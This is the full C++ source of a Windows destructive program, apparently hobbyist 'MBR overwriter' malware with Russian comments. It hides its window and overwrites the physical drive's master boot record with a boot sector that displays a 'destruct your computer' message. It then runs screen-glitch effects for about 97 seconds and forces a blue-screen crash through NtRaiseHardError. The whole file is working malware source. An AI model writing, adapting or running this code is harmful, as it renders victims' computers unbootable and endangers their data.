#include <iostream>
#include <thread>
#include <cstdlib>
#include <Windows.h>

#pragma comment(lib, "ntdll.lib")
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

using namespace std;

unsigned char mbrData[512] = {
  0xb0, 0x4b, 0xe8, 0xbb, 0x00, 0xb0, 0x6f, 0xe8, 0xb6, 0x00, 0xb0, 0x69,
  0xe8, 0xb1, 0x00, 0xb0, 0x73, 0xe8, 0xac, 0x00, 0xb0, 0x68, 0xe8, 0xa7,
  0x00, 0xb0, 0x69, 0xe8, 0xa2, 0x00, 0xb0, 0x20, 0xe8, 0x9d, 0x00, 0xb0,
  0x68, 0xe8, 0x98, 0x00, 0xb0, 0x61, 0xe8, 0x93, 0x00, 0xb0, 0x73, 0xe8,
  0x8e, 0x00, 0xb0, 0x20, 0xe8, 0x89, 0x00, 0xb0, 0x62, 0xe8, 0x84, 0x00,
  0xb0, 0x65, 0xe8, 0x7f, 0x00, 0xb0, 0x65, 0xe8, 0x7a, 0x00, 0xb0, 0x6e,
  0xe8, 0x75, 0x00, 0xb0, 0x20, 0xe8, 0x70, 0x00, 0xb0, 0x64, 0xe8, 0x6b,
  0x00, 0xb0, 0x65, 0xe8, 0x66, 0x00, 0xb0, 0x73, 0xe8, 0x61, 0x00, 0xb0,
  0x74, 0xe8, 0x5c, 0x00, 0xb0, 0x72, 0xe8, 0x57, 0x00, 0xb0, 0x75, 0xe8,
  0x52, 0x00, 0xb0, 0x63, 0xe8, 0x4d, 0x00, 0xb0, 0x74, 0xe8, 0x48, 0x00,
  0xb0, 0x20, 0xe8, 0x43, 0x00, 0xb0, 0x79, 0xe8, 0x3e, 0x00, 0xb0, 0x6f,
  0xe8, 0x39, 0x00, 0xb0, 0x75, 0xe8, 0x34, 0x00, 0xb0, 0x72, 0xe8, 0x2f,
  0x00, 0xb0, 0x20, 0xe8, 0x2a, 0x00, 0xb0, 0x63, 0xe8, 0x25, 0x00, 0xb0,
  0x6f, 0xe8, 0x20, 0x00, 0xb0, 0x6d, 0xe8, 0x1b, 0x00, 0xb0, 0x70, 0xe8,
  0x16, 0x00, 0xb0, 0x75, 0xe8, 0x11, 0x00, 0xb0, 0x74, 0xe8, 0x0c, 0x00,
  0xb0, 0x65, 0xe8, 0x07, 0x00, 0xb0, 0x72, 0xe8, 0x02, 0x00, 0xeb, 0xfe,
  0xb4, 0x0e, 0xb7, 0x00, 0xb3, 0x07, 0xcd, 0x10, 0xc3, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xaa
};

bool running = true;
int seconds = 0;

void timelater() {
	while (true) {
		Sleep(1000);
		seconds++;
		if (!running) {
			break;
		}
	}
}

void BSOD() {
	ULONG r;
	BOOLEAN PrivilegeState = FALSE;
	ULONG ErrorResponse = 0;
	RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
	NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
}

int main() {	
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	// Press F MBR

	HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (deviceHandle == INVALID_HANDLE_VALUE) return 1;
	DWORD bytesWritten;
	WriteFile(deviceHandle, mbrData, sizeof(mbrData), &bytesWritten, nullptr);
	CloseHandle(deviceHandle);
	
	// Ну что? Стартанём!

	thread t(timelater);
	t.detach();

	PlaySound(TEXT("music.wav"), NULL, SND_FILENAME | SND_ASYNC);

	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	// Это то что сгенерировал ChatGPT

	HBITMAP hBitmap = (HBITMAP)LoadImage(NULL, TEXT("pic1.bmp"), IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);

	BITMAP bm;
	GetObject(hBitmap, sizeof(BITMAP), &bm);
	int width = bm.bmWidth;
	int height = bm.bmHeight;

	HDC hdcBitmap = CreateCompatibleDC(NULL);
	HGDIOBJ hOldBitmap = SelectObject(hdcBitmap, hBitmap);

	// Дальше я сам писал этот треш

	while (true) {
		BitBlt(hdc, rand() % w, rand() % h, width, height, hdcBitmap, 0, 0, SRCCOPY);
		Sleep(250);

		if (seconds >= 20) {
			break;
		}
	}

	while (true) {
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		BitBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, NOTSRCCOPY);
		
		Sleep(50);

		if (seconds >= 32) {
			break;
		}
	}

	while (true) {
		BitBlt(hdc, rand() % w, rand() % h, width, height, hdcBitmap, 0, 0, SRCCOPY);
		Sleep(250);

		if (seconds >= 62) {
			break;
		}
	}

	while (true) {
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		BitBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, NOTSRCCOPY);
		Sleep(50);

		if (seconds >= 74) {
			break;
		}
	}

	while (true) {
		BitBlt(hdc, rand() % w, rand() % h, width, height, hdcBitmap, 0, 0, SRCCOPY);
		Sleep(250);

		if (seconds >= 97) {
			BSOD();
		}
	}

	return 0;
}